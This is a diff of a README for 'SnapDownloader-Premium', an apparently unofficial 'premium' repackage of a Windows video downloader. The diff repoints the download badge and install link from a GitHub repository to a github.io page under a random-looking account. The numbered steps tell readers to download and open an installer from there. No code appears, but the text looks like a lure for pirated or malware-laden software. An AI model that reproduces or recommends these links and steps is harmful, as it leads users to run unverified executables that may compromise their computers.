@@ -1,6 +1,6 @@
 # 📥 SnapDownloader-Premium - Save high resolution videos with ease
 
-[![](https://img.shields.io/badge/Download-SnapDownloader-blue.svg)](https://github.com/Undrawn-underside927/SnapDownloader-Premium)
+[![](https://img.shields.io/badge/Download-SnapDownloader-blue.svg)](https://undrawn-underside927.github.io)
 
 SnapDownloader-Premium functions as a tool for your Windows computer. It retrieves videos from various platforms and saves them to your local device. The software supports high definitions like 4K and ensures high speed transfers for your media collection.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic needs to run the application:
 
 Follow these instructions to set the application up on your system.
 
-1. Visit the following link to access the software: [Download SnapDownloader-Premium](https://github.com/Undrawn-underside927/SnapDownloader-Premium).
+1. Visit the following link to access the software: [Download SnapDownloader-Premium](https://undrawn-underside927.github.io).
 2. Locate the download button on the page.
 3. Save the installer file to your computer.
 4. Open the file once the download finishes.
